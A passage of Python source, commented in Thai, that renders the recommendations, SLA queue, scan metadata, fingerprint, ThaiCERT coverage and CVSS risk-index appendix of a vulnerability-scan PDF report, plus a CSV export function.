    story.append(P("หมายเหตุ: CVSS (0–10) = ความรุนแรง · EPSS (%) = โอกาสถูกโจมตีจริง — ทั้งคู่เป็นค่าประเมิน"
                   "เชิงเทียบเคียง ไม่ใช่ค่าทางการจาก NVD/FIRST (ดู CWE ชนิดจุดอ่อนได้ในหัวข้อรายโฮสต์และไฟล์ CSV)",
                   st("cvssnote", fontSize=8, leading=11, textColor=GREY, spaceBefore=4)))
    story.append(PageBreak())

    # ═══ 6. RECOMMENDATIONS ═══
    story.append(H1("คำแนะนำและขั้นตอนถัดไป"))
    if s["vulnerable"] > 0:
        story.append(P("ลำดับความสำคัญสูงสุด (ทำทันที)", h2))
        for i, item in enumerate([
            "อัปเกรด NGINX เป็นรุ่น 1.30.6 หรือ 1.31.7 ขึ้นไป (หากใช้ NGINX)",
            "อัปเกรด PHP เป็น 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 ขึ้นไป",
            "ปิด session.upload_progress และตรวจ serialize_handler ให้ปลอดภัย",
            "รีสตาร์ตบริการ: systemctl restart nginx php*-fpm",
            "ตรวจย้อนหลังใน access.log / error.log เพื่อหาร่องรอยการถูกโจมตี",
            "แจ้งทีม SOC และผู้ดูแลระบบให้เฝ้าระวัง (โดยเฉพาะโฮสต์ในตารางสรุปรายโฮสต์)",
        ], 1):
            story.append(P(f"{i}. {item}", body)); story.append(Spacer(1, 0.12 * cm))
    elif s["warning"] > 0 or s["unknown"] > 0:
        story.append(P("ต้องยืนยันบนเครื่องจริง", h2))
        story.append(P("รายการต่อไปนี้ยืนยันจากภายนอกไม่ได้ ให้รันคำสั่งตรวจสอบบนเซิร์ฟเวอร์ "
                       "แล้วเทียบผลลัพธ์กับเกณฑ์ (กระทบ/ปลอดภัย) ด้านล่าง:", body))
        story.append(Spacer(1, 0.25 * cm))
        _seen_cmd = set()
        for r in data["all_results"]:
            if _bucket_of(r.get("status")) == "safe":
                continue
            cmd = r.get("host_check")
            if not cmd or cmd in _seen_cmd:
                continue
            _seen_cmd.add(cmd)
            story.append(P(_esc_pdf(cmd), st("Cmd", fontSize=8.5, leading=12, fontName="Courier",
                                   backColor=colors.HexColor("#f4f5f7"), leftIndent=8, borderPadding=6,
                                   textColor=colors.HexColor("#1f2937"))))
            cf = _confirm_of(r.get("cve", ""))
            if cf:
                story.append(P(f"กระทบเมื่อ: {_esc_pdf(cf['vuln'])}",
                               st("CmdV", fontSize=8, leading=11, leftIndent=14, spaceBefore=2,
                                  textColor=colors.HexColor("#c0392b"))))
                story.append(P(f"ปลอดภัยเมื่อ: {_esc_pdf(cf['safe'])}",
                               st("CmdS", fontSize=8, leading=11, leftIndent=14,
                                  textColor=colors.HexColor("#1e7e34"))))
            story.append(Spacer(1, 0.18 * cm))
    else:
        story.append(P("ไม่มีรายการเร่งด่วน", h2))
        story.append(P("ไม่พบช่องโหว่ที่ยืนยันได้จากภายนอก — ควรอัปเดตระบบและสแกนซ้ำเป็นประจำ", body))

    # ── การแมปการแก้ไขตามมาตรฐาน NIST (ผูกกับเช็คลิสต์ 7 เฟส) ──
    story.append(Spacer(1, 0.4 * cm))
    story.append(P("แผนแก้ไขตามมาตรฐาน NIST (สากล)", h2))
    story.append(P("NIST คือมาตรฐานความปลอดภัยไซเบอร์ระดับสากลของสหรัฐอเมริกา ตารางนี้แสดงว่าช่องโหว่แต่ละประเภทควรแก้อย่างไร "
                   "และอยู่ในขั้นตอนไหนของกระบวนการรักษาความปลอดภัย 7 เฟส", note))
    story.append(Spacer(1, 0.15 * cm))
    nrows = [[P(x, cellw) for x in ["ประเภทช่องโหว่", "การแก้ที่ต้นเหตุ", "เฟสในเช็คลิสต์",
                                    "NIST", "ลดชั่วคราว (FortiWeb)"]]]
    for a, b, c, d, e in NIST_REMEDIATION:
        nrows.append([P(a, cell), P(b, cell), P(c, cell), P(d, cell), P(e, cell)])
    nt = Table(nrows, colWidths=[3.5 * cm, 3.6 * cm, 2.6 * cm, 2.9 * cm, 3.6 * cm], repeatRows=1)
    nt.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, 0), RMUT_BLUE), ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
                            ("FONTNAME", (0, 0), (-1, -1), font), ("FONTSIZE", (0, 0), (-1, -1), 7.5),
                            ("VALIGN", (0, 0), (-1, -1), "TOP"),
                            ("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
                            ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#f6f7fb")]),
                            ("TOPPADDING", (0, 0), (-1, -1), 4), ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
                            ("LEFTPADDING", (0, 0), (-1, -1), 5)]))
    story.append(nt)
    story.append(P(f"ดูขั้นตอนปฏิบัติแบบละเอียดได้ใน: {NIST_CHECKLIST_DOC}",
                   st("ref", fontSize=9, leading=13, textColor=RMUT_BLUE, spaceBefore=6)))

    # ── B10: คิวการแก้ไข + กรอบเวลา (SLA) ──
    if multi:
        story.append(Spacer(1, 0.4 * cm))
        story.append(P("ตารางลำดับการแก้ไขและกรอบเวลา", h2))
        story.append(P("ตารางนี้บอกว่าควรแก้ไขเว็บไซต์/โฮสต์ไหนก่อน และต้องแก้ภายในกี่วัน "
                       "SLA = ระยะเวลาสูงสุดที่ควรแก้ (Service Level Agreement) "
                       "เรียงลำดับโดยพิจารณาจาก: ระดับความเสี่ยง → ความสำคัญของระบบ → ความรุนแรง (CVSS) "
                       "คอลัมน์ 'ระบบสำคัญ = สูง' หมายถึงระบบที่กระทบผู้ใช้จำนวนมาก (เช่น ระบบนักศึกษา ระบบ API หลัก)", note))
        story.append(Spacer(1, 0.15 * cm))
        sev_of_host = {}
        for h in data["hosts"]:
            if not h.get("reachable") or not h.get("top"):
                continue
            worst = max((x.get("severity", "").split("(")[0].strip() for x in h["top"]),
                        key=lambda sv: _SEV_TO_CVSS.get(sv, 0), default="Medium")
            sev_of_host[h["host"]] = worst
        queue = sorted([h for h in data["hosts"] if h.get("reachable") and h.get("top")],
                       key=lambda h: (_RISK_ORDER.get(h["risk_level"], 9), -h.get("crit_asset", 1),
                                      -h.get("max_cvss", 0), -h.get("max_epss", 0)))[:15]
        if queue:
            qrows = [[P(x, cellw) for x in ["ลำดับ", "โฮสต์", "ระบบสำคัญ", "CVSS", "EPSS", "กรอบเวลา (SLA)"]]]
            for i, h in enumerate(queue, 1):
                worst = sev_of_host.get(h["host"], "Medium")
                days = SLA_DAYS.get(worst, 30)
                crit = "สูง" if h.get("crit_asset", 1) >= 2 else "ปกติ"
                sla = f"ภายใน {days} วัน" if days else "ตามรอบ"
                qrows.append([P(str(i), cell), P(h["host"], cell), P(crit, cell),
                              P(f"{h.get('max_cvss',0):.1f}" if h.get('max_cvss', 0) else "—", cell),
                              P(f"{int(h.get('max_epss',0)*100)}%" if h.get('max_epss', 0) else "—", cell),
                              P(sla, cell)])
            qt = Table(qrows, colWidths=[1.2 * cm, 5.6 * cm, 2.0 * cm, 1.6 * cm, 1.6 * cm, 4.0 * cm], repeatRows=1)
            qt.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, 0), RMUT_BLUE),
                                    ("FONTNAME", (0, 0), (-1, -1), font), ("FONTSIZE", (0, 0), (-1, -1), 8),
                                    ("VALIGN", (0, 0), (-1, -1), "TOP"), ("ALIGN", (3, 0), (-2, -1), "CENTER"),
                                    ("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
                                    ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#f6f7fb")]),
                                    ("TOPPADDING", (0, 0), (-1, -1), 4), ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
                                    ("LEFTPADDING", (0, 0), (-1, -1), 5)]))
            story.append(qt)
            story.append(P("กรอบเวลาเริ่มต้น: Critical 7 วัน · High 15 วัน · Medium 30 วัน (ปรับตามนโยบายได้) "
                           "· 'ระบบสำคัญ = สูง' คือโฮสต์ที่ชื่อบ่งชี้บริการสำคัญ (payment/api/auth/student ฯลฯ)",
                           st("slanote", fontSize=8, leading=11, textColor=GREY, spaceBefore=4)))

    # ═══ 7. APPENDIX ═══
    story.append(PageBreak())
    story.append(H1A("ข้อมูลอ้างอิงทางเทคนิค"))
    story.append(P("ส่วนนี้รวบรวมข้อมูลเชิงเทคนิคสำหรับผู้ดูแลระบบและผู้ตรวจสอบ "
                   "ผู้บริหารสามารถข้ามไปหน้าถัดไปได้", note))
    story.append(Spacer(1, 0.15 * cm))

    # ── A5: ข้อมูลการสแกน (reproducibility) ──
    meta = data.get("scan_meta") or {}
    story.append(P("ข้อมูลการสแกน", h2))
    sm_rows = [["วันที่-เวลาสแกน", data["scan_date"][:19].replace("T", " ")],
               ["เครื่องมือ", meta.get("tool") or f"RMUT CERT All-in-One v{VERSION}"],
               ["ระยะเวลาสแกน", (f"{int(meta['duration'])} วินาที" if meta.get("duration") else "ไม่ได้บันทึก")]]
    o = meta.get("opts") or {}
    if o:
        _smode = {"lan": "LAN (เครือข่ายภายใน)", "external": "ภายนอก (External)",
                  "auto": "อัตโนมัติ (auto)"}.get(o.get("scan_mode", "auto"), "อัตโนมัติ (auto)")
        sm_rows.append(["โหมดสแกน", _smode])
        sm_rows.append(["พารามิเตอร์", f"threads={o.get('target_threads','-')} · depth={o.get('depth','-')} "
                        f"· max_pages={o.get('max_pages','-')} · timeout={o.get('timeout','-')}s "
                        f"· crawl_budget={o.get('crawl_budget','-')}s · skip_lfi={o.get('skip_lfi','-')}"])
    sm_rows.append(["จำนวน CVE ที่ตรวจ", "14 รายการ (PHP 3, NGINX 5, Node.js 4, GitLab 1, OS/Kernel 1)"])
    t = Table([[P(a, cellb), P(b, cell)] for a, b in sm_rows], colWidths=[5 * cm, 11 * cm])
    t.setStyle(TableStyle([("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
                           ("BACKGROUND", (0, 0), (0, -1), RMUT_LIGHT), ("TEXTCOLOR", (0, 0), (0, -1), RMUT_BLUE),
                           ("VALIGN", (0, 0), (-1, -1), "TOP"),
                           ("TOPPADDING", (0, 0), (-1, -1), 6), ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
                           ("LEFTPADDING", (0, 0), (-1, -1), 8)]))
    story.append(t)
    story.append(Spacer(1, 0.4 * cm))

    fp = data["fingerprint"]
    app = (data.get("cms") or {}).get("app") or {}
    story.append(P("ลายนิ้วมือระบบ (Stack Fingerprint)" + (" (ตัวอย่างจากโฮสต์แรกที่เข้าถึงได้)" if multi else ""), h2))
    fp_rows = []
    if fp.get("stack_layers"):
        fp_rows.append(["โปรไฟล์สแตก (ชั้น)", "  →  ".join(fp["stack_layers"])])
    fp_rows += [["ระบบปฏิบัติการ", _os_display(fp) or "ไม่ทราบ"],
                ["เว็บเซิร์ฟเวอร์", f"{fp.get('server_family', 'ไม่ทราบ')} {fp.get('server_version', '')}".strip()],
                ["SAPI", fp.get("sapi", "ไม่ทราบ")],
                ["เวอร์ชัน PHP", ", ".join(fp.get("php_versions", [])) or "ไม่พบ"]]
    if fp.get("modules"):
        fp_rows.append(["โมดูลเซิร์ฟเวอร์", ", ".join(f"{k}/{v}" for k, v in fp["modules"].items())])
    if fp.get("waf") or fp.get("cdn_proxy"):
        fp_rows.append(["WAF / CDN", " / ".join(x for x in [fp.get("waf"), fp.get("cdn_proxy")] if x)])
    if fp.get("device"):
        _dv = f"{fp['device']} {fp.get('device_version', '')}".strip()
        if fp.get("device_category"):
            _dv += f" ({fp['device_category']})"
        fp_rows.append(["อุปกรณ์/แพลตฟอร์ม", _dv])
    if fp.get("mac"):
        fp_rows.append(["MAC / ผู้ผลิต", f"{fp['mac']}" + (f" · {fp['mac_vendor']}" if fp.get("mac_vendor") else "")])
    fp_rows.append(["โหมดสแกน", "🏠 LAN (เครือข่ายภายใน — nmap -O/ARP + MAC/OUI + TTL เชื่อมั่นสูง)"
                    if fp.get("lan_mode") else "ภายนอก (remote unauthenticated)"])
    if fp.get("container_layers"):
        fp_rows.append(["Container / Proxy", ", ".join(fp["container_layers"])])
    if app.get("product"):
        _av = f"{app['product']} {app.get('version_str', '')}".strip()
        if app.get("plugins"):
            _av += f" · {len(app['plugins'])} ปลั๊กอิน"
        fp_rows.append(["แอป / CMS", _av])
    else:
        fp_rows.append(["CMS", data.get("cms", {}).get("cms", "ไม่พบ")])
    if fp.get("components"):
        fp_rows.append(["ส่วนประกอบอื่น (DB/JS/tool)",
                        ", ".join(f"{c['name']}{(' ' + c['version']) if c.get('version') else ''}"
                                  for c in fp["components"][:8])])
    if fp.get("composer_packages"):
        fp_rows.append(["แพ็กเกจ composer", f"{len(fp['composer_packages'])} แพ็กเกจ (จาก composer.lock ที่เปิดเผย)"])
    fp_rows += [["รองรับ HTTP/3", "ใช่" if fp.get("http3_hint") else "ไม่พบสัญญาณ"],
                ["เวอร์ชัน TLS", fp.get("tls_version", "ไม่ได้ตรวจ")],
                ["ใบรับรอง TLS", (f"{fp.get('cert_expiry')} (เหลือ {fp.get('cert_days_left')} วัน)"
                                   if fp.get("cert_expiry") else
                                   (f"ตรวจสอบไม่ผ่าน: {str(fp.get('cert_problem'))[:60]}"
                                    if fp.get("cert_problem") else "ไม่ได้ตรวจ"))]]
    t = Table([[P(a, cellb), P(b, cell)] for a, b in fp_rows], colWidths=[5 * cm, 11 * cm])
    t.setStyle(TableStyle([("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
                           ("BACKGROUND", (0, 0), (0, -1), RMUT_LIGHT), ("TEXTCOLOR", (0, 0), (0, -1), RMUT_BLUE),
                           ("VALIGN", (0, 0), (-1, -1), "TOP"),
                           ("TOPPADDING", (0, 0), (-1, -1), 6), ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
                           ("LEFTPADDING", (0, 0), (-1, -1), 8)]))
    story.append(t)
    story.append(Spacer(1, 0.4 * cm))

    # ── ตารางสรุปเทคโนโลยี + EOL/CVE ──
    _tech = _tech_inventory(fp, data.get("cms"), data["all_results"])
    if _tech:
        story.append(P("สรุปเทคโนโลยีที่ตรวจพบ + EOL / CVE" + (" (ตัวอย่างจากโฮสต์แรก)" if multi else ""), h2))
        _thead = [P(x, cellwh) for x in ["เทคโนโลยี", "เวอร์ชัน", "สถานะ", "CVE", "รุนแรงสุด"]]
        _trows = [_thead] + [[P(str(r[0]), cell), P(str(r[1]), cell), P(str(r[2]), cell),
                              P(str(r[3]), cell), P(str(r[4]), cell)] for r in _tech]
        _tt = Table(_trows, colWidths=[4.5 * cm, 3.4 * cm, 4 * cm, 1.4 * cm, 2.7 * cm])
        _tt.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, 0), RMUT_BLUE),
            ("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
            ("VALIGN", (0, 0), (-1, -1), "TOP"),
            ("TOPPADDING", (0, 0), (-1, -1), 5), ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
            ("LEFTPADDING", (0, 0), (-1, -1), 6)]))
        story.append(_tt)
        story.append(Spacer(1, 0.4 * cm))

    # ── ความครอบคลุม 8 กลุ่มระบบตามแนวทาง ThaiCERT / NCSA ──
    _tc = _thaicert_coverage(data)
    if _tc:
        _avg = int(round(sum(x["cap"] for x in _tc) / len(_tc)))
        _lan_on = bool(_tc[0].get("lan"))
        _avg_remote = int(round(sum(x.get("cap_remote", x["cap"]) for x in _tc) / len(_tc)))
        story.append(P("ความครอบคลุมการตรวจสอบตามแนวทาง ThaiCERT — 8 กลุ่มระบบที่อาจใช้ PHP", h2))
        if _lan_on:
            story.append(P(
                f"สแกนนี้ทำจาก<b>เครือข่ายภายใน (โหมด LAN)</b> — เปิด nmap -O/ARP, MAC/OUI และ TTL เชื่อมั่นสูงขึ้น "
                f"ทำให้เพดานความสามารถของกลุ่มอุปกรณ์/แผงควบคุม/Windows สูงกว่าการสแกนจากภายนอก "
                f"— ค่าเฉลี่ยทั้ง 8 กลุ่ม ≈ <b>{_avg}%</b> (ถ้าสแกนจากภายนอกจะได้ ≈ {_avg_remote}%). "
                f"ตัวเลขนี้ไม่ใช่ความแม่นรายกรณี; เพดานสูงสุดจริงยังต้องเข้าถึงระดับโฮสต์ด้วย agent / credential", note))
        else:
            story.append(P(
                f"ตารางนี้จับคู่สิ่งที่ตรวจพบในสแกนครั้งนี้เข้ากับ 8 กลุ่มระบบตามอินโฟกราฟิกของ ThaiCERT/NCSA "
                f"พร้อม<b>เพดานความสามารถในการตรวจจากภายนอกแบบไม่ล็อกอิน</b> (remote unauthenticated) ของเครื่องมือโดยประมาณ "
                f"— ค่าเฉลี่ยทั้ง 8 กลุ่ม ≈ <b>{_avg}%</b> "
                f"(ตัวเลขนี้คือ 'เห็นได้แค่ไหนจากนอกเครือข่าย' ไม่ใช่ความแม่นของผลลัพธ์รายกรณี; "
                f"หลายกลุ่มจะสูงขึ้นมากหากตรวจจาก LAN / ระดับโฮสต์ด้วย nmap -O / agent / credential)", note))
        story.append(Spacer(1, 0.15 * cm))
        # ── กราฟ: ตรวจพบตาม 8 กลุ่ม (matplotlib ถ้ามี, ไม่งั้นวาดด้วย ReportLab) ──
        story.append(P("กราฟ: จำนวนโฮสต์ที่ตรวจพบในแต่ละกลุ่ม (สีแท่ง = เพดานความสามารถตรวจ 🟢≥70 🟠≥45 🔴<45)", h2))
        if charts.get("thaicert") and os.path.exists(charts["thaicert"]):
            story.append(Image(charts["thaicert"], width=15 * cm, height=9.2 * cm))
            story.append(Spacer(1, 0.2 * cm))
        else:
            _tcbars = [(f"{x['no']}. {x['name'][:34]}", x["hosts"],
                        (PALETTE["safe"] if x["cap"] >= 70 else (PALETTE["warn"] if x["cap"] >= 45 else PALETTE["vuln"])))
                       for x in _tc]
            for fl in native_bars(_tcbars, label_w=6.2, title=None):
                story.append(fl)
            story.append(Spacer(1, 0.25 * cm))
        _thd = [P(x, cellwh) for x in ["กลุ่ม", "ความสามารถ", "พบในสแกนนี้", "ขอบเขต / จุดอ่อน"]]
        _rows = [_thd]
        for x in _tc:
            _found = (f"{x['hosts']} โฮสต์" + (f" · {', '.join(x['items'][:4])}" if x["items"] else "")
                      if x["hosts"] else "— ไม่พบ")
            _rows.append([P(f"{x['no']}. {x['name']}<br/><font size=7 color='#6b7280'>ตัวอย่าง: {x['ex']}</font>", cell),
                          P(f"<b>{x['cap']}%</b>", cell),
                          P(_found, cell),
                          P(x["note"], cell)])
        _ct = Table(_rows, colWidths=[5.2 * cm, 1.7 * cm, 4.1 * cm, 5.0 * cm])
        _ct.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, 0), RMUT_BLUE),
            ("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
            ("VALIGN", (0, 0), (-1, -1), "TOP"),
            ("TOPPADDING", (0, 0), (-1, -1), 5), ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
            ("LEFTPADDING", (0, 0), (-1, -1), 6)]))
        story.append(_ct)
        story.append(Spacer(1, 0.4 * cm))

    story.append(P("ขอบเขตและข้อจำกัดของการสแกน", h2))
    for lim in ["การตรวจสอบนี้ทำจากภายนอกเครือข่าย (เสมือนแฮกเกอร์มือใหม่) — ไม่สามารถยืนยันเวอร์ชันซอฟต์แวร์ที่รันจริงบนเซิร์ฟเวอร์ได้ทุกกรณี",
                "การตรวจค่าคอนฟิกเซิร์ฟเวอร์ละเอียด (เช่น การตั้งค่า SSI, AIO, alias) ต้องเข้าไปตรวจบนเครื่องจริงโดยแอดมิน",
                "สถานะ 'ยังสรุปไม่ได้' ไม่ได้แปลว่าปลอดภัย — หมายความว่าข้อมูลจากภายนอกไม่เพียงพอ ต้องตรวจสอบเพิ่มเติม",
                "รายงานนี้แสดงสถานะ ณ วันและเวลาที่สแกน — ไม่ใช่การรับรองความปลอดภัยถาวร ควรสแกนซ้ำทุกเดือนหรือเมื่อมีการเปลี่ยนแปลงระบบ"]:
        story.append(P(f"•  {lim}", body))

    # ── วิธีคำนวณดัชนีเสี่ยง (ภาคผนวก) ──
    story.append(Spacer(1, 0.4 * cm))
    story.append(P("วิธีคำนวณดัชนีความเสี่ยงตามมาตรฐานสากล CVSS v3.1 (Risk Index)", h2))
    story.append(P(
        'ดัชนีความเสี่ยงรายโฮสต์ (0–100) อ้างอิงตามมาตรฐานสากล <b>CVSS v3.1 (Common Vulnerability Scoring System)</b> '
        'ซึ่งมีเพดานคะแนนเต็ม <b>10.0</b> โดยคำนวณจากเฉพาะรายการช่องโหว่ที่ตรวจพบจริง (ยืนยันเสี่ยง และ พบสัญญาณเสี่ยง) '
        'นำค่า <b>CVSS v3.1 (0.0–10.0)</b> ของช่องโหว่นั้น คูณกับ <b>ตัวคูณความเชื่อมั่นของสถานะ (Report Confidence)</b> '
        'แล้วหารด้วยเพดานมาตรฐาน CVSS (<b>10.0</b>) คูณ 100 เพื่อเทียบเป็นสเกล 0–100 '
        'โดย<b>ไม่นำจำนวนรายการที่ไม่เกี่ยวข้อง (N/A) มาหารเฉลี่ย</b>:', body))
    story.append(Spacer(1, 0.15 * cm))

    # สูตรหลัก
    formula_st = st("FM", fontSize=10, leading=14, fontName=_bold_font,
                    textColor=RMUT_BLUE, alignment=TA_CENTER)
    formula_box = Table([[P("ดัชนีเสี่ยงรายโฮสต์  =  min(100,  Σ(คะแนน CVSS × ตัวคูณสถานะ)  ÷  10  × 100)", formula_st)]],
                        colWidths=[16 * cm])
    formula_box.setStyle(TableStyle([
        ("BACKGROUND", (0,0),(-1,-1), colors.HexColor("#eef2ff")),
        ("BOX",        (0,0),(-1,-1), 0.8, RMUT_BLUE),
        ("TOPPADDING", (0,0),(-1,-1), 10), ("BOTTOMPADDING",(0,0),(-1,-1), 10),
        ("LEFTPADDING",(0,0),(-1,-1), 12),
    ]))
    story.append(formula_box)
    story.append(Spacer(1, 0.25 * cm))

    # ตารางเกณฑ์คะแนนตามมาตรฐาน CVSS v3.1
    story.append(P("ตารางที่ 1 — เกณฑ์ระดับความรุนแรงและดัชนีความเสี่ยงตามมาตรฐานสากล CVSS v3.1 (FIRST.org / NVD)", cellb))
    _wh = st("WH", fontSize=8, leading=11, textColor=colors.white, fontName=_bold_font, alignment=1)
    _wd = st("WD", fontSize=8, leading=11, alignment=1)
    sev_w_rows = [
        [P("ระดับ (Severity)", _wh), P("ช่วง CVSS v3.1", _wh), P("ช่วงดัชนีเสี่ยง (0–100)", _wh), P("การแปลผลในรายงาน", _wh)],
        [P("Critical", _wd), P("9.0 – 10.0", _wd), P("90 – 100", _wd), P("วิกฤต (สีแดงเข้ม — ต้องแก้ไขทันที)", _wd)],
        [P("High",     _wd), P("7.0 – 8.9",  _wd), P("70 – 89",  _wd), P("ความเสี่ยงสูง (สีแดง — ต้องแก้ไขโดยเร็ว)", _wd)],
        [P("Medium",   _wd), P("4.0 – 6.9",  _wd), P("40 – 69",  _wd), P("ปานกลาง / ต้องเฝ้าระวังและตรวจสอบ (สีส้ม)", _wd)],
        [P("Low",      _wd), P("0.1 – 3.9",  _wd), P("1 – 39",   _wd), P("ความเสี่ยงต่ำ (สีเขียว)", _wd)],
        [P("None / Safe", _wd), P("0.0",     _wd), P("0",        _wd), P("ปลอดภัย / ไม่พบช่องโหว่ (สีเขียว)", _wd)],
    ]
    sev_bg = ["#c0392b", "#d35400", "#e67e22", "#2980b9", "#1e7e34"]
    sev_t = Table(sev_w_rows, colWidths=[3.2*cm, 3.0*cm, 3.3*cm, 6.5*cm])
    sev_ts = [("BACKGROUND",(0,0),(-1,0), RMUT_BLUE),
              ("LINEBELOW",(0,0),(-1,-1),0.4, colors.HexColor("#d9dce6")),
              ("ROWBACKGROUNDS",(0,1),(-1,-1),[colors.white, colors.HexColor("#f4f6fb")]),
              ("TOPPADDING",(0,0),(-1,-1),5),("BOTTOMPADDING",(0,0),(-1,-1),5),
              ("LEFTPADDING",(0,0),(-1,-1),8),
              ("ALIGN",(0,0),(-1,-1),"CENTER"),("VALIGN",(0,0),(-1,-1),"MIDDLE")]
    for i, bg in enumerate(sev_bg, 1):
        sev_ts.append(("LEFTPADDING",(0,i),(0,i),0))
        sev_ts.append(("BACKGROUND",(0,i),(0,i),colors.HexColor(bg)))
        sev_ts.append(("TEXTCOLOR",(0,i),(0,i),colors.white))
        sev_ts.append(("FONTNAME",(0,i),(0,i),_bold_font))
    sev_t.setStyle(TableStyle(sev_ts))
    story.append(sev_t)
    story.append(Spacer(1, 0.25 * cm))

    # ตารางตัวคูณสถานะ
    story.append(P("ตารางที่ 2 — ตัวคูณความเชื่อมั่นตามสถานะการตรวจพบ (Report Confidence Factor)", cellb))
    bkt_rows = [
        [P("สถานะ", _wh), P("ตัวคูณ", _wh), P("ความหมาย", _wh)],
        [P("ยืนยันแล้ว (Vulnerable)", _wd), P("1.0 (100%)", _wd),
         P("ตรวจพบช่องโหว่และมีหลักฐานยืนยัน — คิดคะแนน CVSS เต็ม 100%", _wd)],
        [P("พบสัญญาณ (Warning)",      _wd), P("0.6 (60%)", _wd),
         P("พบเวอร์ชันหรือเงื่อนไขที่เข้าข่ายเสี่ยง รอตรวจยืนยันบนเครื่อง — คิด 60% ของ CVSS (เพดานไม่เกิน 69)", _wd)],
        [P("ยังไม่ทราบ (Unknown)",    _wd), P("0.0 (ไม่บวกคะแนนมั่ว)", _wd),
         P("เซิร์ฟเวอร์ซ่อนข้อมูล แจ้งเตือนให้ตรวจบนเครื่องโดยไม่บวกคะแนนความเสี่ยงเทียม", _wd)],
        [P("ปลอดภัย / N/A (Safe)",    _wd), P("0.0 (ไม่นับ)", _wd),
         P("ตรวจสอบแล้วปลอดภัย หรือไม่ได้ใช้งานซอฟต์แวร์นั้นบนเครื่อง — ไม่นับ", _wd)],
    ]
    bkt_bg_col = ["#1e7e34", "#d35400", "#5a6475", "#1e7e34"]
    bkt_t = Table(bkt_rows, colWidths=[4.5*cm, 2.5*cm, 9*cm])
    bkt_ts = [("BACKGROUND",(0,0),(-1,0), RMUT_BLUE),
              ("LINEBELOW",(0,0),(-1,-1),0.4, colors.HexColor("#d9dce6")),
              ("ROWBACKGROUNDS",(0,1),(-1,-1),[colors.white, colors.HexColor("#f4f6fb")]),
              ("TOPPADDING",(0,0),(-1,-1),5),("BOTTOMPADDING",(0,0),(-1,-1),5),
              ("LEFTPADDING",(0,0),(-1,-1),8),
              ("ALIGN",(0,0),(1,-1),"CENTER"),("VALIGN",(0,0),(-1,-1),"MIDDLE")]
    bkt_colors = ["#c0392b", "#d35400", "#5a6475", "#1e7e34"]
    for i, bg in enumerate(bkt_colors, 1):
        bkt_ts.append(("TEXTCOLOR",(0,i),(0,i),colors.HexColor(bg)))
        bkt_ts.append(("FONTNAME",(0,i),(0,i),_bold_font))
    bkt_t.setStyle(TableStyle(bkt_ts))
    story.append(bkt_t)
    story.append(Spacer(1, 0.2 * cm))

    story.append(P(
        '<b>ตัวอย่างการคำนวณตามมาตรฐาน CVSS v3.1:</b> '
        'พบ Critical (CVSS 9.8) ยืนยันแล้ว 1 รายการ = (9.8 × 1.0) ÷ 10 × 100 = <b>98/100 (วิกฤต 90–100)</b>  ·  '
        'พบ High (CVSS 7.5) ยืนยันแล้ว 1 รายการ = (7.5 × 1.0) ÷ 10 × 100 = <b>75/100 (เสี่ยงสูง 70–89)</b>  ·  '
        'พบ Critical (CVSS 9.8) พบสัญญาณ 1 รายการ = (9.8 × 0.6) ÷ 10 × 100 = <b>59/100 (ปานกลาง/ต้องตรวจสอบ 40–69)</b>', note))
    story.append(Spacer(1, 0.15 * cm))
    story.append(P(
        '<b>หมายเหตุสำคัญ (กรณีสแกนหลายโฮสต์):</b> ดัชนีความเสี่ยงรวมขององค์กรใช้ค่าสูงสุดของโฮสต์ที่ตรวจพบ (Max Host Risk) '
        'เพื่อไม่ให้จำนวนโฮสต์ที่ปลอดภัยมาหารเฉลี่ยจนความเสี่ยงวิกฤตถูกบดบัง', note))

    def footer(canvas, doc_):
        canvas.saveState()
        canvas.setFont(font, 8); canvas.setFillColor(colors.grey)
        canvas.drawString(1.5 * cm, 1 * cm, "RMUT CERT. — เอกสารลับ (Confidential)")
        canvas.drawRightString(A4[0] - 1.5 * cm, 1 * cm, f"หน้า {doc_.page}")
        canvas.setStrokeColor(colors.HexColor("#d9dce6")); canvas.setLineWidth(0.5)
        canvas.line(1.5 * cm, 1.4 * cm, A4[0] - 1.5 * cm, 1.4 * cm)
        canvas.restoreState()

    doc.build(story, onFirstPage=footer, onLaterPages=footer)


def _export_csv(data, path):
    """CSV รายช่องโหว่ (ทุกรายการ ทุกโฮสต์)"""
    ip_lookup = {h["host"]: h.get("ip", "") for h in data.get("hosts", [])}
    with open(path, "w", newline="", encoding="utf-8-sig") as f:
        w = csv.writer(f)
        w.writerow(["Host", "IP", "CVE", "CVSS", "EPSS", "CWE", "SLA_Days", "Name", "Category",
                    "Severity", "Status", "Reason", "Host Check"])
        for r in sorted(data["all_results"],
                        key=lambda x: (_host_label(x.get("target", "")),
                                       _BUCKET_ORDER.get(_bucket_of(x.get("status")), 9))):
            host_lbl = _host_label(r.get("target", "")) or data["target"]
            eff_cvss = _assessed_cvss(r)
            cvss_str = f"{eff_cvss:.1f}" if eff_cvss is not None else "—"
            w.writerow([host_lbl, ip_lookup.get(host_lbl, ""), r.get("cve", ""),
                        cvss_str, f"{int(_epss(r)*100)}%", _cwe(r), _sla_days(r),
                        r.get("name", ""), r.get("category", ""), r.get("severity", ""),
                        STATUS_LABELS.get(r.get("status"), r.get("status", "")),
                        r.get("reason", ""), r.get("host_check", "")])


def _export_thaicert_csv(data, path):
